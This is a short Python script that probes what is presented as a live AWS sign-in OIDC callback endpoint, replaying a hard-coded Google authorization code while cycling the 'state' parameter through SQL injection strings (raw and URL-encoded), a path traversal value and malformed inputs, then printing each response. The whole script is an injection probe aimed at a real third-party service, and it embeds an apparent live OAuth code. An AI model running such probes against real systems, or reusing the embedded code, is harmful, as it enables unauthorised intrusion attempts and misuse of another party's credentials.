import requests
from urllib.parse import urlencode

# Base endpoint and static parameters
base_url = "https://us-east-1.signin.aws/platform/d-9067642ac7/oidc/callback"
static_params = {
    "code": "4/0Ab32j93z8ZjwVcSxor10Zy_lJ-F4bHaZS8M0cKAXkgVh5SpigBn2Gb85aeKIfCasHX7UIQ",
    "scope": "email profile https://www.googleapis.com/auth/userinfo.profile https://www.googleapis.com/auth/userinfo.email openid",
    "authuser": "0",
    "prompt": "consent"
}

# Test cases for the 'state' parameter
state_variants = {
    "clean": "9edd0012-0626-4f85-ac60-723551c1bf00",
    "malformed_uuid": "xyz-123",
    "sqli_raw": "9edd0012-0626-4f85-ac60-723551c1bf00' OR '1'='1;",
    "sqli_encoded": "9edd0012-0626-4f85-ac60-723551c1bf00%27%20OR%20%271%27=%271;",
    "empty": "",
    "null": "null",
    "path_traversal": "../oidc/callback"
}

# Run tests
for label, state_value in state_variants.items():
    params = static_params.copy()
    params["state"] = state_value
    full_url = f"{base_url}?{urlencode(params)}"
    
    print(f"\n🔍 Testing '{label}' state variant:")
    print(f"URL: {full_url}")
    
    try:
        response = requests.get(full_url, timeout=10)
        print(f"Status Code: {response.status_code}")
        print("Headers:")
        for k, v in response.headers.items():
            print(f"  {k}: {v}")
        print("Body Snippet:")
        print(response.text[:500])  # Print first 500 chars for brevity
    except Exception as e:
        print(f"⚠️ Request failed: {e}")
